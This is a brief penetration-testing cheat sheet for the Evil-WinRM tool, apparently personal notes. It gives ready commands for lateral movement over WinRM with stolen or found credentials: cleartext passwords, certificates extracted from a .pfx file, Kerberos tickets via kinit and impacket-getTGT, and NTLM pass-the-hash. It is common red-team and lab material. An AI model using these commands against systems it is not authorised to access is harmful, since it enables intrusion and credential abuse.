# Evil-WinRM 

## Link: https://github.com/Hackplayers/evil-winrm

## Port: 5985 (Over HTTP) 5986 (Over HTTPS)

## TIP: Use -S flag to enable SSL. Use this when the WinRM port is 5986 (Over HTTPS)

### Do lateral movement via WinRM protocol using foudn credentials with evil-winrm

## Authentication Methods

#### 1) Clear text Password

 - evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD

#### 2) Certificate (.pfx file)

     openssl pkcs12 -in USER_PFX_CERT.pfx -nocerts -out key.pem -nodes

       openssl pkcs12 -in USER_PFX_CERT.pfx -nokeys -out cert.pem

### After generating the private key from the .pfx file, we use Evil-WinRM to authenticate

    evil-winrm -i TARGET_IP -c CERT.pem -k KEY.pem

#### 3) Kerberos

    kinit USERNAME@DOMAIN.LOCAL (Authenticate and retrieve a ticket on Windows)
  
    impacket-getTGT DOMAIN.LOCAL/USERNAME:PASSWORD (Request a TGT ticket on Linux)

 Configure /etc/krb5.conf file with the appropriate settings (Replace some of the placeholders for your use case)

       [libdefaults]
        default_realm = DOMAIN.LOCAL
        ticket_lifetime = 24h
        renew_lifetime = 7d
        forwardable = true
        dns_lookup_realm = false
        dns_lookup_kdc = true

       [realms]
       DOMAIN.local = {
        kdc = IP or Hostname of KDC/Domain Controller
        admin_server = IP or Hostname of Admin Server
       }

       [domain_realm]
        .domain.local = DOMAIN.LOCAL
        domain.local = DOMAIN.LOCAL

### 

    evil-winrm -r DOMAIN.LOCAL -i DC.DOMAIN.LOCAL (Authenticate via kerberos)

#### 4) NTLM Authentication (Pass-the-Hash)

    evil-winrm -i TARGET_IP -u USER -H NTLM_HASH
